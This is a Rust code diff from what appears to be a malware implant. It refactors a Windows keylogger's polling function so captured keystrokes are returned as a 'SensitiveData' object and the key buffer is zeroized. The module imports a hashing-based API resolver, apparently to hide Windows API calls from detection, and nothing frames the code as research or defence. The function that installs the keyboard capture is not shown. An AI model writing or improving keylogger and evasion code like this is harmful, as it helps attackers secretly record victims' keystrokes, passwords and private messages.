@@ -1,4 +1,4 @@
-use alloc::string::String;
+use crate::utils::sensitive::SensitiveData;
 
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
@@ -11,7 +11,7 @@ static mut KEY_BUFFER: alloc::vec::Vec<u8> = alloc::vec::Vec::new();
 static mut KEYLOGGER_RUNNING: bool = false;
 
 impl Collection {
-    pub fn keylogger_poll(&self) -> String {
+    pub fn keylogger_poll(&self) -> Option<SensitiveData> {
         #[cfg(target_os = "windows")]
         unsafe {
             if !KEYLOGGER_RUNNING {
@@ -20,12 +20,16 @@ impl Collection {
             }
             
             let buffer = &mut *core::ptr::addr_of_mut!(KEY_BUFFER);
-            let result = String::from_utf8_lossy(buffer).into_owned();
+            if buffer.is_empty() { return None; }
+            
+            let sensitive = SensitiveData::new(buffer);
+            buffer.zeroize();
             buffer.clear();
-            result
+            
+            Some(sensitive)
         }
         #[cfg(not(target_os = "windows"))]
-        { String::from("Keylogging not supported on Linux") }
+        { None }
     }
 
     #[cfg(target_os = "windows")]
